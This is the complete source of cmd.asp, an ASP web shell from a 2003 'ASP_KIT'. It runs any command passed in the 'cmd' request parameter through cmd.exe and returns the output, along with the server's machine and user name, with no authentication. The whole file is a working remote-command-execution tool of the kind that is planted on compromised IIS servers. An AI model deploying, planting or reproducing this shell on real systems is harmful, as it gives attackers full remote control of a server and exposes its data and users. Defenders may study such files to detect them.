<!--

ASP_KIT

cmd.asp = Command Execution

by: Maceo
modified: 25/06/2003

-->

<%
Set oScript = Server.CreateObject("WSCRIPT.SHELL")
Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")

szCMD = request("cmd")

If (szCMD <> "") Then
  szTempFile = "C:\" & oFileSys.GetTempName()
  Call oScript.Run ("cmd.exe /c " & szCMD & " > " & szTempFile, 0, True)
  Set oFile = oFileSys.OpenTextFile(szTempFile, 1, False, 0)
  End If
%>

<HTML>
<BODY>
<FORM action="" method="GET">
<input type="text" name="cmd" size=45 value="<%= szCMD %>">
<input type="submit" value="Run">
</FORM>
<PRE>
<%= "\\" & oScriptNet.ComputerName & "\" & oScriptNet.UserName %>
<br>
<%
  If (IsObject(oFile)) Then
    On Error Resume Next
    Response.Write Server.HTMLEncode(oFile.ReadAll)
    oFile.Close
    Call oFileSys.DeleteFile(szTempFile, True)
  End If
%>
</BODY>
</HTML>
